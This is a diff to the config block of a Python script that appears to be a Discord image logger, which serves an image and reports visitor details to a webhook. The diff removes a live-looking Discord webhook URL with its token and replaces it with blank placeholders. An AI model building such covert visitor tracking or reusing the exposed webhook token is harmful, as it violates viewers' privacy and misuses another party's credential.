@@ -4,8 +4,8 @@ import traceback, requests, base64, httpagentparser
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334907866330693712/Vf3nSE_RjXsRFxLYCUXGeF5yBhU-debKZebLuoZEvJYFyAqsDJhkQWgJuWcuP7lh103W",
-    "image": "https://www.laleggepertutti.it/cl_resize/wIR5vslCLAY_Jd5bxJ15RJzBwtN5gxKGrcOD0g9Jlxs/rs:fill:500:0/g:ce/q:70/aHR0cHM6Ly93d3cubGFsZWdnZXBlcnR1dHRpLml0L3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzEwL2ltbWFnaW5pLW1hZ2xpZXR0ZS1kaXJpdHRvLWF1dG9yZS1lMTYwMjY2ODU5MjIxMy5qcGc",
+    "webhook": "", # Your webhook link
+    "image": "", # The image you want the site to load
     "imageArgument": True,
 
     
